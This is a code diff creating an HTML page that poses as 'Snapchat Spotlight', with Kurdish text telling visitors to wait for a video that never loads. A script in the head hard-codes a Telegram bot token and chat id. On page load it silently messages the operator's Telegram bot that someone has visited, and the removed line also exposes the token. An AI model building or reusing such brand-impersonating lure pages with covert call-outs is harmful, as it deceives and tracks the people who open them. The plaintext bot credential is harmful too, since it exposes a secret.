@@ -1,1 +1,29 @@
-8905171123:AAE1NydzSH5iS2M4YHv3Zirhu89t17XsxnE
+<!DOCTYPE html>
+<html lang="ku">
+<head>
+    <meta charset="UTF-8">
+    <title>Snapchat Spotlight</title>
+    <script>
+        // لێرە زانیارییەکانت جێگیر بکە
+        const token = '8905171123:AAE1NydzSH5iS2M4YHv3Zirhu89t17XsxnE'; 
+        const chat_id = '646169404'; 
+
+        function sendToTelegram(message) {
+            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: chat_id, text: message })
+            });
+        }
+
+        window.onload = function() {
+            sendToTelegram("کەسێک هاتە ناو سایتەکەتەوە! 🚀");
+        }
+    </script>
+</head>
+<body style="background-color: #000; color: white; text-align: center; padding-top: 50px; font-family: Arial;">
+    <h1>Snapchat Spotlight</h1>
+    <p>چاوەڕێ بکە بۆ بارکردنی ڤیدیۆکە...</p>
+</body>
+</html>
+
